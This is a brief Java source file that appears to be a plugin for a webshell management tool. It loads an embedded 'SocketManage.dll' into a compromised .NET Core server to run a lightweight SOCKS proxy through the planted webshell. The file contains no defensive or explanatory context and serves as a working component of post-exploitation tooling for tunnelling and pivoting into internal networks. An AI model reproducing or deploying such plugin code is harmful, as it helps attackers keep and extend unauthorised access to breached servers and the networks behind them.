package shells.plugins.netcore;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.EasySocksProxy;
import util.functions;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "EasySocksProxy",
        DisplayName = "\u8f7b\u91cf\u4ee3\u7406"
)
public class NEasySocksProxy extends EasySocksProxy {
    public NEasySocksProxy() {
    }

    public String getClassName() {
        return "SocketManage.Run";
    }

    protected byte[] getPlugin() {
        return functions.readInputStreamAutoClose(NEasySocksProxy.class.getResourceAsStream("assets/SocketManage.dll"));
    }
}
